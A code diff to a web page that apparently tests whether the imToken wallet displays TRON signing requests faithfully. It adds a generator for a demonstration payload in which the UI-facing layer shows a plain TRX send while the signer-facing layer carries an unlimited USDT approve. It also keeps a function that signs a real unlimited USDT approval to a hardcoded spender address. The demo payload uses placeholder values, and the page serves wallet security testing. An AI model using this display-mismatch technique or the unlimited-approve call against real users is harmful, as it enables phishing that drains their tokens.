@@ -56,50 +56,62 @@
             </div>
         </div>
 
-        <!-- Payload 生成器 -->
-        <div class="tron-card rounded-2xl p-6 mb-6">
-            <div class="font-semibold mb-4">构造可疑的 signing payload（模拟 DApp 发送）</div>
+        <!-- 第二种 Payload 生成器（分析用） -->
+        <div class="tron-card rounded-2xl p-6 mb-6 border border-red-900/60">
+            <div class="font-semibold mb-2 text-red-400">生成可疑 Signing Payload（第二种 - 仅用于分析）</div>
+            <div class="text-xs text-zinc-400 mb-4">
+                此功能仅生成结构上可能存在不一致的 signing request 对象（模拟恶意 DApp 通过 WalletConnect / Provider 发送的内容）。<br>
+                <strong>它不会真正发给 imToken 签名</strong>。用于帮助理解和抓包时对比字段。
+            </div>
             
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                 <div>
-                    <label class="text-xs text-zinc-400">call_value (sun) - 用于误导 UI</label>
+                    <label class="text-xs text-zinc-400">call_value (sun)</label>
                     <input id="call_value" type="number" value="10000" class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-2 font-mono">
                 </div>
                 <div>
-                    <label class="text-xs text-zinc-400">spender</label>
+                    <label class="text-xs text-zinc-400">spender（用于 approve data）</label>
                     <input id="spender" type="text" value="TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz" class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-2 font-mono text-sm">
                 </div>
             </div>
 
-            <button onclick="generateMaliciousPayload()" 
+            <button onclick="generateInconsistentPayload()" 
                     class="w-full py-3 bg-red-600 hover:bg-red-500 rounded-2xl font-semibold flex items-center justify-center gap-x-2">
                 <i class="fa-solid fa-bug"></i>
-                <span>生成第二种恶意 Payload（模拟字段不一致）</span>
+                <span>生成可疑 Payload（突出字段不一致点）</span>
             </button>
         </div>
 
-        <!-- 结果展示 -->
-        <div id="result" class="hidden tron-card rounded-2xl p-6 mb-6">
-            <div class="font-semibold mb-4 text-red-400">生成的恶意 signing request（WalletConnect / Provider 风格）</div>
+        <!-- 结果展示（第二种分析） -->
+        <div id="result" class="hidden tron-card rounded-2xl p-6 mb-6 border border-red-900/60">
+            <div class="font-semibold mb-3 text-red-400">生成的 Signing Request Payload（第二种结构演示）</div>
             
             <div class="mb-4">
-                <div class="text-xs text-zinc-400 mb-1">UI 可能读取的“展示用”结构（误导部分）</div>
-                <pre id="ui_view" class="bg-black p-4 rounded-xl text-xs overflow-auto text-emerald-300 border border-emerald-900/50"></pre>
+                <div class="text-xs text-amber-400 mb-1 flex items-center gap-x-2">
+                    <span>关键检查点（抓包时重点对比）</span>
+                </div>
+                <div class="text-[10px] text-zinc-400 bg-zinc-900 p-3 rounded-xl">
+                    • raw_data 与 raw_data_hex 解码后是否一致？<br>
+                    • txID 是否等于 raw_data 重新计算的结果？<br>
+                    • 是否存在 transaction / transaction.transaction 嵌套不一致？<br>
+                    • UI preview 读取的是哪一层？Signer 最终签的是哪一份 canonical bytes？
+                </div>
             </div>
 
-            <div class="mb-4">
-                <div class="text-xs text-red-400 mb-1">实际签名模块可能读取的结构（真实 approve）</div>
-                <pre id="sign_view" class="bg-black p-4 rounded-xl text-xs overflow-auto text-red-300 border border-red-900/50"></pre>
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-4">
+                <div>
+                    <div class="text-xs text-emerald-400 mb-1">外层 / UI 可能优先读取的结构</div>
+                    <pre id="outer_view" class="bg-black p-3 rounded-xl text-[10px] overflow-auto text-emerald-300 border border-emerald-900/50 max-h-[220px]"></pre>
+                </div>
+                <div>
+                    <div class="text-xs text-red-400 mb-1">内层 / 实际可能被 signer 使用的结构</div>
+                    <pre id="inner_view" class="bg-black p-3 rounded-xl text-[10px] overflow-auto text-red-300 border border-red-900/50 max-h-[220px]"></pre>
+                </div>
             </div>
 
             <div>
-                <div class="text-xs text-zinc-400 mb-1">完整 payload（DApp 实际发送给钱包的）</div>
-                <pre id="full_payload" class="bg-zinc-950 p-4 rounded-xl text-[10px] overflow-auto max-h-[400px] border border-zinc-700"></pre>
-            </div>
-
-            <div class="mt-4 text-xs text-amber-400">
-                注意：真实攻击中，DApp 会构造这种结构让钱包 UI 展示和实际签名内容不一致。<br>
-                txID 仍需与 raw_data 一致，否则签名无效。
+                <div class="text-xs text-zinc-400 mb-1">完整请求对象（模拟 WalletConnect / Provider 收到）</div>
+                <pre id="full_payload" class="bg-zinc-950 p-4 rounded-xl text-[10px] overflow-auto max-h-[320px] border border-zinc-700"></pre>
             </div>
         </div>
 
@@ -169,6 +181,68 @@
             }
         }
 
+        // 生成更接近第二种概念的 payload（结构上可能存在不一致）
+        function generateInconsistentPayload() {
+            const callValueSun = parseInt(document.getElementById('call_value').value) || 10000;
+            const spender = document.getElementById('spender').value.trim();
+
+            // 构造 approve 的 data（简化演示，实际应正确 ABI 编码 + Base58 转 hex）
+            const selector = '095ea7b3';
+            // 注意：真实场景需要正确把 TRON Base58 spender 转为 20 字节 hex
+            const fakeAddrPadded = '000000000000000000000000' + '1234567890abcdef1234567890abcdef12345678'; // 演示用
+            const maxAmountPadded = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+            const approveDataHex = selector + fakeAddrPadded + maxAmountPadded;
+
+            // === 外层 / UI 可能优先看到的结构（可能被误导） ===
+            const outerForUI = {
+                visible: true,
+                txID: "demo_txid_from_outer...",
+                raw_data: {
+                    contract: [{
+                        type: "TriggerSmartContract",
+                        parameter: {
+                            value: {
+                                contract_address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+                                call_value: callValueSun,
+                                // 这里可能只展示 call_value，导致 UI 显示“发送 TRX”
+                            }
+                        }
+                    }]
+                }
+            };
+
+            // === 内层 / 实际可能被签名模块使用的结构 ===
+            const innerForSigner = {
+                contract_address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+                call_value: callValueSun,
+                data: "0x" + approveDataHex,  // 真实是 approve
+            };
+
+            // 模拟完整 WalletConnect / Provider 请求对象（可能存在不一致）
+            const suspiciousPayload = {
+                id: Date.now(),
+                jsonrpc: "2.0",
+                method: "tron_signTransaction",
+                params: [
+                    {
+                        visible: true,
+                        // 外层 transaction（UI 可能读这个）
+                        transaction: outerForUI,
+                        // 实际 raw_data / raw_data_hex（signer 可能读这个）
+                        raw_data: innerForSigner,
+                        raw_data_hex: "0a" + approveDataHex + "...(真实应为 protobuf 序列化)",
+                        txID: "demo_txid_should_match_raw_data...",
+                    }
+                ]
+            };
+
+            // 更新展示
+            document.getElementById('outer_view').textContent = JSON.stringify(outerForUI, null, 2);
+            document.getElementById('inner_view').textContent = JSON.stringify(innerForSigner, null, 2);
+            document.getElementById('full_payload').textContent = JSON.stringify(suspiciousPayload, null, 2);
+            document.getElementById('result').classList.remove('hidden');
+        }
+
         async function buildAndSignRealTx() {
             if (!tronWebInstance || !userAddress) {
                 alert('请先点击「连接 imToken / TronLink」');
@@ -177,11 +251,12 @@
             
             const callValueSun = parseInt(document.getElementById('call_value').value) || 10000;
             const spender = document.getElementById('spender').value.trim();
-            const amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // max for demo
+            const amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
             
             const usdt = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
             
             try {
+                // 注意：这是标准的第一种 TriggerSmartContract（合法 approve + call_value）
                 const txBuilder = await tronWebInstance.transactionBuilder.triggerSmartContract(
                     usdt,
                     'approve(address,uint256)',
@@ -202,9 +277,10 @@
                 const resultDiv = document.getElementById('real_tx_result');
                 resultDiv.classList.remove('hidden');
                 resultDiv.innerHTML = `
-                    <div class="text-emerald-400 font-medium">上链成功！</div>
+                    <div class="text-emerald-400 font-medium">上链成功（第一种标准交易）</div>
                     <div class="font-mono text-xs mt-1 break-all">TXID: ${result.txid || result.transaction?.txID}</div>
                     <a href="https://tronscan.org/#/transaction/${result.txid}" target="_blank" class="text-emerald-400 underline text-xs">在 TronScan 查看</a>
+                    <div class="text-[10px] text-zinc-500 mt-1">此路径为标准合法 approve，用于对比 imToken 是否正确显示授权。</div>
                 `;
                 
             } catch (error) {
